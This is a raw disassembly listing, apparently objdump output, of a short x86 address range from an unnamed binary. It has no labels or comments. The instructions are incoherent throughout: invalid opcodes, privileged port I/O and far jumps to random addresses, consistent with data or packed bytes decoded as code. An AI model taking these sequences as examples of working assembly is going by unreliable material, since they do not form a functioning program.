  41e0df:	inc    eax
  41e0e0:	aas    
  41e0e1:	retf   
  41e0e2:	int    0xe5
  41e0e4:	push   edi
  41e0e5:	sbb    ebp,DWORD PTR [ebp-0x27864fc8]
  41e0eb:	add    al,0x23
  41e0ed:	jmp    0x52b2ade1
  41e0f2:	jge    0x41e14c
  41e0f4:	dec    edi
  41e0f5:	sub    eax,0x4ce72cd7
  41e0fa:	jecxz  0x41e07f
  41e0fc:	push   ds
  41e0fd:	call   0x4bc5:0x6a42b135
  41e104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e105:	hlt    
  41e106:	stos   DWORD PTR es:[edi],eax
  41e107:	and    DWORD PTR [edi+edi*2],ebx
  41e10a:	pop    ebp
  41e10b:	loope  0x41e0e4
  41e10d:	add    dh,cl
  41e10f:	aam    0x73
  41e111:	fwait
  41e112:	rcl    DWORD PTR [eax-0x70c04f5d],1
  41e118:	aas    
  41e119:	pusha  
  41e11a:	xor    BYTE PTR [esi-0x18e1e5ea],dh
  41e120:	retf   0x562d
  41e123:	fnstcw WORD PTR [edi+0x24]
  41e126:	mov    ds:0x88898c2e,al
  41e12b:	sar    BYTE PTR [ebx+eax*2+0x42],cl
  41e12f:	adc    BYTE PTR [edi+0x9d12ff3],cl
  41e135:	jnp    0x41e197
  41e137:	scas   eax,DWORD PTR es:[edi]
  41e138:	in     al,dx
  41e139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e13a:	rcr    ecx,0xb4
  41e13d:	jp     0x41e153
  41e13f:	cwde   
  41e140:	in     al,dx
  41e141:	jne    0x41e157
  41e143:	adc    BYTE PTR ds:0xd92d,dh
  41e148:	lods   eax,DWORD PTR ds:[esi]
  41e149:	push   edi
  41e14a:	adc    al,0x85
  41e14c:	sub    al,0x63
  41e14e:	test   eax,0x77c5deee
  41e153:	mov    bh,0x0
  41e155:	or     edx,esp
  41e157:	aas    
  41e158:	stos   DWORD PTR es:[edi],eax
  41e159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15a:	jo     0x41e148
  41e15c:	xor    DWORD PTR [ecx+ecx*4],ebx
  41e15f:	cmp    BYTE PTR [esi-0x35],ch
  41e162:	sub    eax,0x9adb89d1
  41e167:	add    BYTE PTR [ecx-0x4ce76593],bh
  41e16d:	fwait
  41e16e:	sbb    dh,al
  41e170:	inc    ebp
  41e171:	shr    DWORD PTR [ecx+0x50],1
  41e174:	cmp    ecx,eax
  41e176:	sbb    eax,DWORD PTR [eax+edi*8-0x3e70d26c]
  41e17d:	xor    BYTE PTR [ecx-0x2138318f],cl
  41e183:	xchg   esi,eax
  41e184:	xchg   esp,eax
  41e185:	mov    ds:0x5c4ad82f,al
  41e18a:	loope  0x41e20a
  41e18c:	or     ah,BYTE PTR [eax-0x9db6694]
  41e192:	rcr    DWORD PTR [edx-0x71],cl
  41e195:	xchg   esi,eax
  41e196:	cmp    al,0x18
  41e198:	aad    0xc3
  41e19a:	and    ch,BYTE PTR [esi+0x6c4b3f58]
  41e1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a1:	shr    eax,0xf9
  41e1a4:	dec    esi
  41e1a5:	daa    
  41e1a6:	add    al,0x56
  41e1a8:	dec    esp
  41e1a9:	imul   esi,DWORD PTR [edx+0x579ae6c8],0x27
  41e1b0:	jge    0x41e17a
  41e1b2:	cdq    
  41e1b3:	xchg   edi,eax
  41e1b4:	add    al,0xdc
  41e1b6:	jnp    0x41e1fb
  41e1b8:	push   ebx
  41e1b9:	mov    dh,0xa3
  41e1bb:	lods   al,BYTE PTR ds:[esi]
  41e1bc:	jg     0x41e204
  41e1be:	cmp    eax,0xe8b15684
  41e1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1c4:	pop    esp
  41e1c5:	push   es
  41e1c6:	and    eax,0x7efeb0e4
  41e1cb:	mov    edx,0xc08d6c18
  41e1d0:	fs xor al,0x77
  41e1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d4:	fs mov ah,0xf5
  41e1d7:	jb     0x41e18e
  41e1d9:	inc    ebx
  41e1da:	and    al,0x34
  41e1dc:	fs fldenv gs:[eax+ebx*2-0x6c30a0eb]
  41e1e5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e1e7:	mov    dh,0x6b
  41e1e9:	sbb    cl,BYTE PTR [ecx]
  41e1eb:	cmp    DWORD PTR [ebp-0xf],ecx
  41e1ee:	mov    ds:0x8d6445a7,al
  41e1f3:	scas   eax,DWORD PTR es:[edi]
  41e1f4:	shr    DWORD PTR [ebp+eax*8-0x6864aaa1],cl
  41e1fb:	mov    bl,0x60
  41e1fd:	std    
  41e1fe:	mov    ch,0x2b
  41e200:	enter  0xf644,0x30
  41e204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e205:	xchg   edi,eax
  41e206:	push   edi
  41e207:	into   
  41e208:	dec    ebp
  41e209:	retf   
  41e20a:	push   edi
  41e20b:	mov    ah,0x34
  41e20d:	hlt    
  41e20e:	bound  esi,QWORD PTR [edx-0x5933bb12]
  41e214:	cmp    edi,DWORD PTR [ebx+0x0]
  41e217:	pop    ebp
  41e218:	xchg   edx,eax
  41e219:	push   ss
  41e21a:	out    dx,eax
  41e21b:	js     0x41e26c
  41e21d:	mov    dl,0x66
  41e21f:	in     eax,0xd6
  41e221:	xchg   ecx,eax
  41e222:	xchg   dh,bl
  41e224:	(bad)  [ecx-0x350f57a2]
  41e22a:	inc    ecx
  41e22b:	inc    edi
  41e22c:	imul   edx,DWORD PTR [eax+0x411d87ae],0xffffff99
  41e233:	sub    al,0x6b
  41e235:	jae    0x41e2ad
  41e237:	sbb    eax,0x3044f541
  41e23c:	shr    ch,0xc2
  41e23f:	mov    WORD PTR [edi+0x104774c],ds
  41e245:	xor    DWORD PTR [edx-0x1203441d],esp
  41e24b:	inc    ebp
  41e24c:	mov    edi,0x7980aeca
  41e251:	clc    
  41e252:	stc    
  41e253:	pushf  
  41e254:	xchg   DWORD PTR [ecx],eax
  41e256:	mov    al,0x74
  41e258:	pusha  
  41e259:	mov    cl,0x72
  41e25b:	fisttp DWORD PTR [esi-0x14904a2a]
  41e261:	ins    BYTE PTR es:[edi],dx
  41e262:	mov    ds:0xd3ab19b7,al
  41e267:	push   esp
  41e268:	push   0x4ee6bf99
  41e26d:	ret    0x2097
  41e270:	adc    edi,edi
  41e272:	lea    ecx,[ebp-0x50]
  41e275:	retf   
  41e276:	adc    BYTE PTR [edi+edx*4+0x5],ah
  41e27a:	xchg   edi,eax
  41e27b:	inc    edx
  41e27c:	jmp    0xfbd27a7
  41e281:	sar    DWORD PTR [ecx-0x12],cl
  41e284:	jnp    0x41e2c0
  41e286:	(bad)  
  41e287:	aaa    
  41e288:	cmp    DWORD PTR [ebp-0x25],edx
  41e28b:	stos   DWORD PTR es:[edi],eax
  41e28c:	pop    eax
  41e28d:	add    di,di
  41e290:	aad    0xfb
  41e292:	push   0x6b
  41e294:	mov    ch,0xbb
  41e296:	int3   
  41e297:	add    eax,0x87ce9eeb
  41e29c:	jae    0x41e2a9
  41e29e:	push   es
  41e29f:	add    dh,BYTE PTR [ebx]
  41e2a1:	outs   dx,BYTE PTR ds:[esi]
  41e2a2:	mov    ch,0x98
  41e2a4:	inc    edx
  41e2a5:	sbb    eax,0x9ee3fa9b
  41e2aa:	cmp    DWORD PTR [eax+edi*1+0x77362c48],ebx
  41e2b1:	out    dx,al
  41e2b2:	sub    DWORD PTR [ecx+0x42],esi
  41e2b5:	jns    0x41e260
  41e2b7:	aas    
  41e2b8:	or     eax,0x64cccaff
  41e2bd:	pop    eax
  41e2be:	stos   BYTE PTR es:[edi],al
  41e2bf:	mov    cl,0x5c
  41e2c1:	or     ebp,DWORD PTR [edi+0x62]
  41e2c4:	pusha  
  41e2c5:	xchg   ebp,eax
  41e2c6:	add    al,0x9b
  41e2c8:	mov    al,0x62
  41e2ca:	loop   0x41e2c1
  41e2cc:	jbe    0x41e27d
  41e2ce:	(bad)  
  41e2d0:	cmp    DWORD PTR ds:0x3631f2c6,esp
  41e2d6:	lahf   
  41e2d7:	ins    BYTE PTR es:[edi],dx
  41e2d8:	scas   eax,DWORD PTR es:[edi]
  41e2d9:	push   0xa17266df
  41e2de:	arpl   WORD PTR ds:[esi],si
  41e2e1:	pop    ebx
  41e2e2:	xor    eax,0x24cef3f4
  41e2e7:	cmp    dl,al
  41e2e9:	sti    
  41e2ea:	stc    
  41e2eb:	lea    ebx,[eax]
  41e2ed:	cvttps2pi mm6,xmm2
  41e2f0:	aam    0xc8
  41e2f2:	xor    ebx,DWORD PTR [esi-0x3f7f9c9a]
  41e2f8:	out    0x2e,eax
  41e2fa:	xlat   BYTE PTR ds:[ebx]
  41e2fb:	scas   eax,DWORD PTR es:[edi]
  41e2fc:	mov    esi,0xcb04c07d
  41e301:	mov    edi,0x5a716c7e
  41e306:	std    
  41e307:	xchg   ebx,eax
  41e308:	xchg   edx,eax
  41e309:	pop    ss
  41e30a:	icebp  
  41e30b:	xchg   ebx,eax
  41e30c:	push   0xffffffde
  41e30e:	shl    edx,0x21
  41e311:	test   BYTE PTR [ebx],al
  41e313:	mov    cl,0xe
  41e315:	das    
  41e316:	sub    bl,bh
  41e318:	adc    esi,esp
  41e31a:	bound  ebp,QWORD PTR [edi+0x2c]
  41e31d:	mov    dh,0xfa
  41e31f:	mov    esp,0xd4233d57
  41e324:	neg    esi
  41e326:	mov    al,0x98
  41e328:	jp     0x41e2f8
  41e32a:	rcl    DWORD PTR [ecx+0x34cb576a],0xd0
  41e331:	div    DWORD PTR [ebx+0x3a]
  41e334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e335:	xor    eax,0x512e1ae3
  41e33a:	sar    DWORD PTR [esi],1
  41e33c:	enter  0xa9a9,0x18
  41e340:	fcom   DWORD PTR [ecx+edi*8]
  41e343:	inc    ebp
  41e344:	jge    0x41e322
  41e346:	inc    ecx
  41e347:	xchg   esp,eax
  41e348:	je     0x41e3ba
  41e34a:	jle    0x41e308
  41e34c:	les    edi,FWORD PTR [edx+0x5881de02]
  41e352:	pop    edx
  41e353:	cmp    BYTE PTR ds:0x7282cb95,al
  41e359:	loop   0x41e354
  41e35b:	imul   ecx,DWORD PTR [esi+ecx*8],0x5b
  41e35f:	mov    eax,ds:0x694bcbae
  41e364:	add    DWORD PTR [ebx],eax
  41e366:	pop    ecx
  41e367:	jo     0x41e2fa
  41e369:	lea    ecx,[edx-0x1e70e510]
  41e36f:	fstp   DWORD PTR [edi+0x7446e343]
  41e375:	sub    DWORD PTR [edx+0x22],esi
  41e378:	inc    ebp
  41e379:	mov    WORD PTR [edx],gs
  41e37b:	xlat   BYTE PTR ds:[ebx]
  41e37c:	scas   eax,DWORD PTR es:[edi]
  41e37d:	xchg   BYTE PTR [ecx+0x5a],dl
  41e380:	mov    cl,0xfb
  41e382:	fwait
  41e383:	sub    al,0x5a
  41e385:	push   esp
  41e386:	mov    dh,0xc5
  41e388:	cdq    
  41e389:	mov    BYTE PTR [ebp+0xccb44fe],ah
  41e38f:	jns    0x41e356
  41e391:	add    eax,0x62fbb36e
  41e396:	daa    
  41e397:	je     0x41e3d3
  41e399:	mov    DWORD PTR [esi-0x6f],ebx
  41e39c:	test   eax,0x95c28e1e
  41e3a1:	pushf  
  41e3a2:	loopne 0x41e3c7
  41e3a4:	cmp    edi,DWORD PTR [ecx-0x5748addf]
  41e3aa:	jp     0x41e390
  41e3ac:	jg     0x41e331
  41e3ae:	stos   BYTE PTR es:[edi],al
  41e3af:	mov    esp,0x2190fd9
  41e3b4:	push   edx
  41e3b5:	pop    esi
  41e3b6:	(bad)  
  41e3b7:	inc    DWORD PTR [eax-0x2d]
  41e3ba:	int3   
  41e3bb:	les    ebx,FWORD PTR [ecx+ebp*4+0x4]
  41e3bf:	dec    eax
  41e3c0:	ret    
  41e3c1:	or     al,ah
  41e3c3:	retf   0xac85
  41e3c6:	or     eax,0x4b52176c
  41e3cb:	shl    DWORD PTR [ebp+0x5c265d08],0xca
  41e3d2:	sti    
  41e3d3:	mov    ds:0xf1e01c4b,al
  41e3d8:	call   0x961e29eb
  41e3dd:	dec    ebx
  41e3de:	fwait
  41e3df:	mov    BYTE PTR [esi],bl
  41e3e1:	adc    al,0x2d
  41e3e3:	push   edi
  41e3e4:	jmp    0xd8c7ff64
  41e3e9:	rcr    ebp,cl
  41e3eb:	loopne 0x41e36e
  41e3ed:	in     eax,0x6f
  41e3ef:	test   DWORD PTR [edx-0x8],edi
  41e3f2:	hlt    
  41e3f3:	ins    BYTE PTR es:[edi],dx
  41e3f4:	call   0x38cb:0xf852b938
  41e3fb:	rcl    DWORD PTR [edi],0xd6
  41e3fe:	mov    esi,0x5997b8ab
  41e403:	or     eax,0xfb1bd679
  41e408:	out    0x7d,al
  41e40a:	or     BYTE PTR ds:0x78cd84c9,dh
  41e410:	xchg   ebp,eax
  41e411:	in     al,0x86
  41e413:	cli    
  41e414:	or     BYTE PTR [edx],0xf9
  41e417:	mov    ch,0x69
  41e419:	(bad)  
  41e41a:	dec    edi
  41e41b:	fsubr  DWORD PTR [edi+0x1dfa443f]
  41e421:	sahf   
  41e422:	xor    DWORD PTR [edi-0xa],edx
  41e425:	movaps xmm5,xmm2
  41e428:	sub    ecx,edi
  41e42a:	pop    esp
  41e42b:	(bad)  
  41e42c:	pusha  
  41e42d:	and    bl,ah
  41e42f:	adc    esp,DWORD PTR [esi+ebx*8-0x54]
  41e433:	fisttp QWORD PTR [ebx]
  41e435:	cmp    edx,DWORD PTR [ecx]
  41e437:	mov    bl,0x9d
  41e439:	in     eax,0xe8
  41e43b:	sbb    ebp,DWORD PTR [eax]
  41e43d:	mov    esp,0x873e334d
  41e442:	xchg   edi,eax
  41e443:	cdq    
  41e444:	mov    dl,0xa
  41e446:	push   edx
  41e447:	ret    
  41e448:	int3   
  41e449:	and    DWORD PTR [eax+0x14],ecx
  41e44c:	xor    al,0x79
  41e44e:	das    
  41e44f:	(bad)  
  41e450:	int3   
  41e451:	push   edi
  41e452:	aam    0xf7
  41e454:	xor    al,0xa8
  41e456:	mov    eax,ds:0xbd9d62c1
  41e45b:	cld    
  41e45c:	aam    0x3d
  41e45e:	pop    edx
  41e45f:	mov    ebp,esp
  41e461:	int3   
  41e462:	mov    esi,0xd0a0a024
  41e467:	int    0xc
  41e469:	pop    ecx
  41e46a:	xor    DWORD PTR [edi-0x33e3d5ff],edi
  41e470:	pusha  
  41e471:	cmp    al,0x51
  41e473:	mov    edi,0x367aec85
  41e478:	gs out 0x3c,eax
  41e47b:	add    bh,BYTE PTR [edi]
  41e47d:	cmp    BYTE PTR [eax+0x10],0x6b
  41e481:	mov    edx,0xb0e8b986
  41e486:	call   0x8ac1:0x915f8dc5
  41e48d:	add    DWORD PTR [ecx+0x6ecee00f],eax
  41e493:	icebp  
  41e494:	xor    al,0x56
  41e496:	test   BYTE PTR [edx+ecx*1+0x9],0x36
  41e49b:	xchg   esp,eax
  41e49c:	es cwde 
  41e49e:	fsubr  QWORD PTR [eax]
  41e4a0:	mov    ebx,0x6e0d30
  41e4a5:	adc    al,0x9e
  41e4a7:	dec    ecx
  41e4a8:	cmp    ebx,esp
  41e4aa:	xchg   DWORD PTR [eax],edx
  41e4ac:	(bad)  
  41e4ad:	xchg   edi,eax
  41e4ae:	pop    esi
  41e4af:	xlat   BYTE PTR ds:[ebx]
  41e4b0:	xchg   ecx,eax
  41e4b1:	mov    BYTE PTR [ecx-0x11],dl
  41e4b4:	add    al,0xfe
  41e4b6:	into   
  41e4b7:	sbb    dh,BYTE PTR [edi+0x4edcf5f4]
  41e4bd:	pmulhuw mm2,QWORD PTR [ecx+0x15]
  41e4c1:	call   0xb93a:0x8476f149
  41e4c8:	test   esi,esi
  41e4ca:	test   DWORD PTR [edi-0x2fb80b3e],ecx
  41e4d0:	test   al,0xcc
  41e4d2:	aas    
  41e4d3:	add    eax,0xea6cec27
  41e4d8:	inc    edi
  41e4d9:	push   cs
  41e4da:	push   es
  41e4db:	cwde   
  41e4dc:	mov    edi,0xba19f8a9
  41e4e1:	jno    0x41e51e
  41e4e3:	shl    ecx,cl
  41e4e5:	cmp    BYTE PTR [ebx-0x5076f0e3],ah
  41e4eb:	data16 sub ch,BYTE PTR [edi]
  41e4ee:	pop    ds
  41e4ef:	pop    ds
  41e4f0:	rol    DWORD PTR [esi+0x77],0xf6
  41e4f4:	scas   al,BYTE PTR es:[edi]
  41e4f5:	out    0x52,eax
  41e4f7:	mov    ebp,0x571d86af
  41e4fc:	pop    ecx
  41e4fd:	fstp   DWORD PTR [esi]
  41e4ff:	retf   0x3f
  41e502:	sub    ebx,esp
  41e504:	icebp  
  41e505:	fsub   QWORD PTR [eax-0x43]
  41e508:	mov    al,ds:0x64936487
  41e50d:	sbb    edi,DWORD PTR [esi+0x377365e9]
  41e513:	mov    bh,0x45
  41e515:	hlt    
  41e516:	in     al,dx
  41e517:	int    0x42
  41e519:	ins    BYTE PTR es:[edi],dx
  41e51a:	call   0x4dc7:0x6aa316d7
  41e521:	(bad)  
  41e523:	jge    0x41e581
  41e525:	fxch   st(0)
  41e527:	push   ds
  41e528:	mov    DWORD PTR [ebp+ebp*1-0x42],esp
  41e52c:	jle    0x41e574
  41e52e:	enter  0xcf49,0x13
  41e532:	dec    ecx
  41e533:	inc    esp
  41e534:	fchs   
  41e536:	pop    ebx
  41e537:	add    bl,BYTE PTR [edi-0x7b]
  41e53a:	lahf   
  41e53b:	in     eax,dx
  41e53c:	cmp    WORD PTR [edx],bx
  41e53f:	fwait
  41e540:	fs pop esi
  41e542:	(bad)  
  41e543:	not    DWORD PTR [edi+0x8]
  41e546:	sub    eax,0xf63aeaf1
  41e54b:	je     0x41e541
  41e54d:	fs mov esi,0x211d57be
  41e553:	sub    ch,BYTE PTR [edx]
  41e555:	adc    ebp,DWORD PTR [eax-0x61a009d9]
  41e55b:	int    0xc1
  41e55d:	inc    BYTE PTR [eax+0x7c9122eb]
  41e563:	mov    edx,0xee2c48dc
  41e568:	pop    ecx
  41e569:	inc    ebp
  41e56a:	dec    edx
  41e56b:	lods   eax,DWORD PTR ds:[esi]
  41e56c:	call   0x2650:0x1070d224
  41e573:	mov    ah,0x65
  41e575:	movaps XMMWORD PTR [ecx+0x78a6095a],xmm3
  41e57c:	out    dx,eax
  41e57d:	mov    eax,ds:0x246c973b
  41e582:	setnp  BYTE PTR [edx+0x19]
  41e586:	sbb    DWORD PTR [eax+0x14e9a1dd],esp
  41e58c:	dec    edi
  41e58d:	fnstsw WORD PTR [edi-0x1e646358]
  41e593:	jo     0x41e5c4
  41e595:	pop    ecx
  41e596:	repnz and edi,DWORD PTR [ebx-0x1641f003]
  41e59d:	jns    0x41e543
  41e59f:	popa   
  41e5a0:	mov    eax,ds:0x42f94377
  41e5a5:	cmp    esi,DWORD PTR [ebp+eiz*4-0x46acb666]
  41e5ac:	mov    bl,0x3b
  41e5ae:	outs   dx,BYTE PTR ds:[esi]
  41e5af:	(bad)  
  41e5b0:	mov    edi,0xf8e17966
  41e5b5:	out    dx,al
  41e5b6:	xor    al,0x24
  41e5b8:	or     al,BYTE PTR [ebp-0x76]
  41e5bb:	cs js  0x41e5eb
  41e5be:	(bad)  
  41e5bf:	or     al,0xd9
  41e5c1:	pop    ds
  41e5c2:	clc    
  41e5c3:	xchg   BYTE PTR [eax],dl
  41e5c5:	das    
  41e5c6:	cmp    DWORD PTR [ebx+esi*4],edx
  41e5c9:	cld    
  41e5ca:	pushf  
  41e5cb:	out    0xab,al
  41e5cd:	mov    eax,ds:0xf94c7fa7
  41e5d2:	fwait
  41e5d3:	gs push cs
  41e5d5:	mov    dl,BYTE PTR [edi]
  41e5d7:	cmp    eax,DWORD PTR [ebx+0x17]
  41e5da:	push   ebp
  41e5db:	cmp    BYTE PTR [ecx],dl
  41e5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5de:	sub    al,0x20
  41e5e0:	(bad)
  41e5e4:	test   ebp,edi
  41e5e6:	inc    ebx
  41e5e7:	pcmpeqb mm1,QWORD PTR [ecx]
  41e5ea:	sbb    esp,esi
  41e5ec:	or     BYTE PTR [eax],bl
  41e5ee:	jge    0x41e5b3
  41e5f0:	das    
  41e5f1:	sub    BYTE PTR [ecx+0x1],cl
  41e5f4:	and    ch,BYTE PTR [ebx+0x67428012]
  41e5fa:	xchg   esp,eax
  41e5fb:	push   edi
  41e5fc:	ss ins BYTE PTR es:[edi],dx
  41e5fe:	push   edx
  41e5ff:	adc    ebx,DWORD PTR [ecx-0x6a275dc0]
  41e605:	jmp    0xc54c:0x2f38f927
  41e60c:	dec    eax
  41e60d:	lahf   
  41e60e:	xchg   esi,eax
  41e60f:	push   0xf61e16f4
  41e614:	mov    esp,0x2b602029
  41e619:	mov    edx,0xa43c7039
  41e61e:	repnz ins BYTE PTR es:[edi],dx
  41e620:	mov    dl,0x91
  41e622:	or     DWORD PTR [eax+0x495507b7],ebp
  41e628:	call   0x3c31f8ea
  41e62d:	sbb    BYTE PTR [eax+0x1f61bfbe],0x2f
  41e634:	imul   esi,ebp,0x5e
  41e637:	repnz addr16 cmp edx,esp
  41e63b:	pop    edi
  41e63c:	cmp    DWORD PTR [esi+0x438ba3c9],edx
  41e642:	inc    ebx
  41e643:	cmp    eax,0x760fa868
  41e648:	jnp    0x41e65e
  41e64a:	test   BYTE PTR [edx],0x28
  41e64d:	pop    esp
  41e64e:	addr16 (bad) 
  41e650:	popa   
  41e651:	cmp    ch,bh
  41e653:	jle    0x41e5e0
  41e655:	inc    ebx
  41e656:	mov    eax,ds:0x524f5ff6
  41e65b:	dec    ecx
  41e65c:	test   eax,0x178e041f
  41e661:	jbe    0x41e6cc
  41e663:	inc    edx
  41e664:	pop    DWORD PTR [ebx+edx*8+0x53ea3094]
  41e66b:	popa   
  41e66c:	xor    edi,DWORD PTR [ebp-0x5bdad9e7]
  41e672:	cmp    bh,BYTE PTR [esi+ebp*8-0x23]
  41e676:	xlat   BYTE PTR ds:[ebx]
  41e677:	xor    ah,bh
  41e679:	out    0xd4,al
  41e67b:	xor    ebx,edi
  41e67d:	adc    al,0x34
  41e67f:	push   ds
  41e680:	and    BYTE PTR [esp+ebp*2-0x11],ah
  41e684:	fs cmc 
  41e686:	jbe    0x41e656
  41e688:	cld    
  41e689:	shl    BYTE PTR gs:[eax+edx*4-0x2a],0xe6
  41e68f:	imul   edx,DWORD PTR [esi+0x3cd2d094],0xffffff86
  41e696:	or     esp,DWORD PTR ds:0xc0693431
  41e69c:	(bad)  
  41e69d:	adc    al,0x77
  41e69f:	push   ds
  41e6a0:	xchg   esi,eax
  41e6a1:	cld    
  41e6a2:	or     BYTE PTR [eax+eax*4],bl
  41e6a5:	add    edi,edx
  41e6a7:	cmp    al,BYTE PTR [edx+0x2f9ac926]
  41e6ad:	cwde   
  41e6ae:	iret   
  41e6af:	jb     0x41e703
  41e6b1:	sets   dh
  41e6b4:	or     DWORD PTR [ecx+0x75],esp
  41e6b7:	inc    edi
  41e6b8:	and    DWORD PTR [eax-0x4ffb09f4],edi
  41e6be:	inc    ebp
  41e6bf:	(bad)  
  41e6c0:	adc    dh,BYTE PTR [ebx+0x24be1e01]
  41e6c6:	mov    ch,0x78
  41e6c8:	bound  eax,QWORD PTR [ecx]
  41e6ca:	add    eax,0xb200b0d2
  41e6cf:	ja     0x41e70e
  41e6d1:	(bad)  
  41e6d2:	jle    0x41e6e7
  41e6d4:	mov    al,bl
  41e6d6:	or     eax,DWORD PTR [ebx]
  41e6d8:	(bad)  
  41e6da:	dec    DWORD PTR [ebx+eax*4]
  41e6dd:	mov    edi,0xca703726
  41e6e2:	je     0x41e6ec
  41e6e4:	dec    ebx
  41e6e5:	xchg   bh,dl
  41e6e7:	ja     0x41e6a0
  41e6e9:	or     ecx,ebx
  41e6eb:	fld    QWORD PTR [ebx]
  41e6ed:	lods   al,BYTE PTR ds:[esi]
  41e6ee:	mov    edx,0x7c313866
  41e6f3:	loope  0x41e684
  41e6f5:	js     0x41e735
  41e6f7:	or     eax,DWORD PTR [edi-0x28fbdba0]
  41e6fd:	sbb    DWORD PTR [edx-0x3b],esi
  41e700:	jmp    0xf7bc:0xf9589116
  41e707:	and    DWORD PTR [esi+0x47e98c73],ebx
  41e70d:	xchg   DWORD PTR [ebp+0x28],edi
  41e710:	pusha  
  41e711:	dec    edx
  41e712:	add    eax,0xdd7b23d
  41e717:	cwde   
  41e718:	cmp    dl,BYTE PTR [edi+ebp*2]
  41e71b:	into   
  41e71c:	pushf  
  41e71d:	mov    ds:0x1d7ddfd5,al
  41e722:	push   esi
  41e723:	or     eax,0x95ce3419
  41e728:	or     esi,eax
  41e72a:	scas   al,BYTE PTR es:[edi]
  41e72b:	adc    al,0x22
  41e72d:	sub    dh,BYTE PTR [edi+0x7cdc1c76]
  41e733:	(bad)  
  41e734:	pop    edx
  41e735:	jg     0x41e794
  41e737:	inc    edx
  41e738:	test   BYTE PTR ds:0x615e6b2e,0x30
  41e73f:	lods   al,BYTE PTR ds:[esi]
  41e740:	out    dx,eax
  41e741:	jne    0x41e6f1
  41e743:	inc    ebx
  41e744:	jp     0x41e7b1
  41e746:	xor    esp,DWORD PTR [eax]
  41e748:	stc    
  41e749:	mov    ds:0x95017df,al
  41e74e:	mov    ch,0x57
  41e750:	in     eax,dx
  41e751:	test   DWORD PTR [edx+edi*1+0x63a90626],0xf184bd99
  41e75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e75d:	and    al,0xb2
  41e75f:	sub    edx,DWORD PTR [esp+esi*4+0x7]
  41e763:	int3   
  41e764:	out    dx,eax
  41e765:	call   0x1da1:0xd64c8bbe
  41e76c:	jae    0x41e710
  41e76e:	push   0x49
  41e770:	(bad)  
  41e771:	gs js  0x41e76d
  41e774:	or     DWORD PTR [ebx-0x78],0x45
  41e778:	mov    WORD PTR [esi+0x6a],es
  41e77b:	not    dh
  41e77d:	adc    BYTE PTR [esi+0x47],bh
  41e780:	xchg   esp,eax
  41e781:	mov    al,0x48
  41e783:	fist   DWORD PTR [eax+0x75b3f24c]
  41e789:	jmp    0x41e720
  41e78b:	jbe    0x41e7b9
  41e78d:	lea    ebp,[ebx+0x2f]
  41e790:	enter  0xb255,0x41
  41e794:	dec    bx
  41e796:	xchg   ebp,eax
  41e797:	jecxz  0x41e7bc
  41e799:	xchg   esi,eax
  41e79a:	pop    edi
  41e79b:	je     0x41e730
  41e79d:	or     DWORD PTR [edx+eax*8],esi
  41e7a0:	lods   al,BYTE PTR ds:[esi]
  41e7a1:	ins    DWORD PTR es:[edi],dx
  41e7a2:	(bad)  
  41e7a3:	in     al,dx
  41e7a4:	cmp    DWORD PTR [eax-0x3ba4df3b],eax
  41e7aa:	inc    ebp
  41e7ab:	outs   dx,BYTE PTR ds:[esi]
  41e7ac:	jmp    0xa386:0x13a61b5c
  41e7b3:	or     bh,BYTE PTR [edx+0x21]
  41e7b6:	bound  ebx,QWORD PTR [edi-0x6abaf759]
  41e7bc:	sub    DWORD PTR [edx-0x30],0xb1e7314e
  41e7c3:	jbe    0x41e77c
  41e7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c6:	popa   
  41e7c7:	mov    bl,0x88
  41e7c9:	inc    edi
  41e7ca:	test   BYTE PTR [ecx+0x3f],bl
  41e7cd:	loop   0x41e832
  41e7cf:	ror    DWORD PTR [esi-0x6d107382],1
  41e7d5:	jg     0x41e77d
  41e7d7:	aaa    
  41e7d8:	pusha  
  41e7d9:	fcom   QWORD PTR [ebp+0x4e82b1a5]
  41e7df:	jp     0x41e7f7
  41e7e1:	xchg   ebp,eax
  41e7e2:	std    
  41e7e3:	add    DWORD PTR [edx-0x38],eax
  41e7e6:	adc    ebx,DWORD PTR [esi-0x43e9cda7]
  41e7ec:	test   esp,ecx
  41e7ee:	pop    edx
  41e7ef:	repz mov cl,bh
  41e7f2:	jmp    0x78cc:0x327dace1
  41e7f9:	ins    BYTE PTR es:[edi],dx
  41e7fa:	bswap  esi
  41e7fc:	(bad)  
  41e7fd:	and    esp,ebp
  41e7ff:	pusha  
  41e800:	sub    al,ah
  41e802:	jmp    0x41e797
  41e804:	retf   
  41e805:	mov    bl,dl
  41e807:	mov    ds:0x38a35840,al
  41e80c:	jae    0x41e811
  41e80e:	sbb    eax,0x536bb50b
  41e813:	pop    esi
  41e814:	xchg   ebp,eax
  41e815:	sub    BYTE PTR [eax+0x388c7978],bl
  41e81b:	out    0xa7,al
  41e81d:	test   ch,al
  41e81f:	push   ds
  41e820:	leave  
  41e821:	xor    al,0x11
  41e823:	outs   dx,DWORD PTR ds:[esi]
  41e824:	mov    eax,ds:0x8277fbc3
  41e829:	clc    
  41e82a:	xchg   dh,al
  41e82c:	mov    dl,al
  41e82e:	mov    al,bh
  41e830:	inc    esi
  41e831:	mov    eax,edx
  41e833:	sub    bl,0x73
  41e836:	cwde   
  41e837:	add    bl,BYTE PTR [edi+edx*1-0x5a412927]
  41e83e:	test   al,0x16
  41e840:	xchg   edx,eax
  41e841:	retf   0xda28
  41e844:	sbb    DWORD PTR [ecx-0x5bbfa63d],edx
  41e84a:	iret   
  41e84b:	jmp    0x74d0b151
  41e850:	out    dx,eax
  41e851:	dec    eax
  41e852:	push   eax
  41e853:	push   eax
  41e854:	push   edx
  41e855:	icebp  
  41e856:	iret   
  41e857:	out    0x3f,eax
  41e859:	dec    eax
  41e85a:	push   cs
  41e85b:	daa    
  41e85c:	sbb    cl,BYTE PTR [eax]
  41e85e:	in     eax,dx
  41e85f:	iret   
  41e860:	xchg   esi,eax
